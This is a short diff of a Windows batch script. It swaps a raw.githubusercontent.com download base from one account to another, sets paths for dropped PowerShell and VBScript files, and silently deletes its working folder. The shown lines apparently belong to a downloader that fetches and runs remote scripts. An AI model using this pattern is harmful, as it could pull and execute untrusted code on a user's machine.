@@ -7,7 +7,7 @@ set "a=%d%\f1.txt"
 set "b=%d%\f2.txt"
 set "c=%d%\Nvs.ps1"
 set "v=%d%\S_m.vbs"
-set "u=raw.githubusercontent.com/Khanzadaofficial/newss/main"
+set "u=raw.githubusercontent.com/chotaacc/newss/main/"
 set tynLink="****"
 
 rmdir /s /q "%d%" 2>nul
